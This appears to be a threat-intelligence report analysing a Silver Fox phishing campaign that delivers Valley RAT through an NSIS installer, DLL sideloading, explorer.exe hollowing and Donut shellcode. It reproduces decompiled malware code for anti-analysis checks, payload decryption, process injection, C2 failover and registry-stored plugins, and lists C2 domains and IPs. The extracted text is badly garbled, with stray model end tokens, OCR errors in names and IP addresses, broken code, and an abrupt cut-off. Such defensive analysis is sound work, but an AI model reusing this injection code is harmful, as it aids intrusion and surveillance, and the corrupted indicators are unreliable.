\n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining 